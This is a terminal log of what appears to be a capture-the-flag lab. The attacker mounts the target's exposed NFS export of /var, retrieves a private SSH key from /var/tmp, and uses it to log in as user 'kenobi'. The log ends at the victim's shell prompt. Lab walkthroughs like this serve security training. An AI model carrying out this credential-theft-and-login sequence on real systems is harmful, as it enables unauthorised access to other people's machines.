
```sh
┌──(kali㉿kali)-[~]
└─$ sudo mkdir /mnt/kenobiNFS

┌──(kali㉿kali)-[~]
└─$ sudo mount 10.10.140.251:/var /mnt/kenobiNFS

┌──(kali㉿kali)-[/mnt/kenobiNFS]
└─$ ls -la
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  4 root root  4096 Apr 22 08:37 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root tss   4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Apr 22 08:34 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

┌──(kali㉿kali)-[/mnt/kenobiNFS/tmp]
└─$ ls -la
total 28
drwxrwxrwt  6 root root 4096 Apr 22 08:34 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
-rw-r--r--  1 kali kali 1675 Apr 22 08:34 id_rsa
drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------  3 root root 4096 Apr 22 08:03 systemd-private-b1ac0ce85ada400cb8c019211b07df1d-systemd-timesyncd.service-EYQpTN
drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn

┌──(kali㉿kali)-[/mnt/kenobiNFS/tmp]
└─$ cp id_rsa ~      

┌──(kali㉿kali)-[~]
└─$ mv id_rsa id_rsa.kenobi                
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa.kenobi
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa.kenobi kenobi@10.10.140.251   
The authenticity of host '10.10.140.251 (10.10.140.251)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.140.251' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls -la

```